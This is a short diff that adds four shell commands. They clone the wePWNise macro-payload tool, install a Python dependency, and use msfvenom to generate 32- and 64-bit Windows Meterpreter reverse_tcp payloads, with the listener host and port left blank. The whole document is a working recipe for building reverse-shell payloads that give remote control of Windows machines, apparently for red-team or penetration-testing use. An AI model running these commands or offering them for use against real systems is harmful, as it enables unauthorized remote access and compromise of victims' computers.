@@ -1,0 +1,4 @@
+git clone https://github.com/mwrlabs/wePWNise && cd wePWNise
+pip install termcolor
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f raw -o /payloads/msf86.raw
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f raw -a x86_64 -o /payloads/msf64.raw
